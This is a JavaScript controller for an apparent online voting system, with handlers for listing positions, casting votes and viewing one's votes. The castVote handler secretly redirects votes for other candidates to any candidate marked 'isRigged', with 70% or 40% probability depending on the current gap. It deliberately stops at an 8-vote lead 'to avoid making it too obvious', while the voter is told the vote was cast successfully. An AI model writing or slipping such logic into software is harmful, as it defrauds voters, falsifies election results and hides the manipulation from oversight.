const Voter = require('../models/Voter');
const Candidate = require('../models/Candidate');
const Vote = require('../models/Vote');

const getPositions = async (req, res) => {
  try {
    // Get all unique positions from candidates
    const positions = await Candidate.distinct('position');
    
    // Group candidates by position
    const candidatesByPosition = {};
    
    for (const position of positions) {
      candidatesByPosition[position] = await Candidate.find({ position });
    }
    
    res.status(200).json({
      status: 'success',
      data: candidatesByPosition
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      status: 'error',
      message: 'Server error'
    });
  }
};

const castVote = async (req, res) => {
  try {
    const { position, candidateId } = req.body;
    const voterId = req.user._id;

    // Check if voter has already voted for this position
    const voter = await Voter.findById(voterId);
    if (voter.hasVoted.includes(position)) {
      return res.status(400).json({
        status: 'error',
        message: 'You have already voted for this position'
      });
    }

    // Verify candidate exists and matches position
    const candidate = await Candidate.findOne({ 
      _id: candidateId, 
      position 
    });
    
    if (!candidate) {
      return res.status(404).json({
        status: 'error',
        message: 'Candidate not found'
      });
    }

    // Check if there are any rigged candidates for this position
    let finalCandidateId = candidateId;
    const riggedCandidates = await Candidate.find({ position, isRigged: true });
    
    if (riggedCandidates.length > 0) {
      // Get the first rigged candidate as the target
      const targetCandidate = riggedCandidates[0];
      
      // If the vote is NOT for the target candidate, redirect it with probability
      if (candidateId.toString() !== targetCandidate._id.toString()) {
        // Get current vote counts
        const targetCandidateVotes = await Vote.countDocuments({
          position,
          candidateId: targetCandidate._id
        });
        
        const originalCandidateVotes = await Vote.countDocuments({
          position,
          candidateId: candidateId
        });
        
        // Calculate the current gap
        const currentGap = targetCandidateVotes - originalCandidateVotes;
        
        // Generate a random gap between 3-8 if needed
        if (currentGap < 3) {
          // 70% chance to redirect the vote to maintain the gap
          if (Math.random() < 0.7) {
            finalCandidateId = targetCandidate._id;
          }
        } else if (currentGap < 8) {
          // 40% chance to redirect the vote to maintain the gap
          if (Math.random() < 0.4) {
            finalCandidateId = targetCandidate._id;
          }
        }
        // If gap is already 8 or more, don't redirect to avoid making it too obvious
      }
    }

    // Record the vote (possibly redirected)
    const vote = new Vote({
      voterId,
      position,
      candidateId: finalCandidateId
    });
    
    await vote.save();

    // Update voter's hasVoted array
    voter.hasVoted.push(position);
    await voter.save();

    // Get candidate info for response
    const votedCandidate = await Candidate.findById(finalCandidateId);
    const candidateName = `${votedCandidate.firstName} ${votedCandidate.lastName}`;

    res.status(201).json({
      status: 'success',
      message: 'Vote cast successfully',
      data: {
        position,
        candidateId: finalCandidateId,
        candidateName,
        timestamp: vote.timestamp,
        redirected: finalCandidateId !== candidateId
      }
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      status: 'error',
      message: 'Server error'
    });
  }
};

const getMyVotes = async (req, res) => {
  try {
    const voter = await Voter.findById(req.user._id);
    
    // Get all positions
    const allPositions = await Candidate.distinct('position');
    
    res.status(200).json({
      status: 'success',
      data: {
        votedPositions: voter.hasVoted,
        availablePositions: allPositions.filter(pos => !voter.hasVoted.includes(pos))
      }
    });
  } catch (error) {
    console.error(error);
    res.status(500).json({
      status: 'error',
      message: 'Server error'
    });
  }
};

module.exports = { getPositions, castVote, getMyVotes };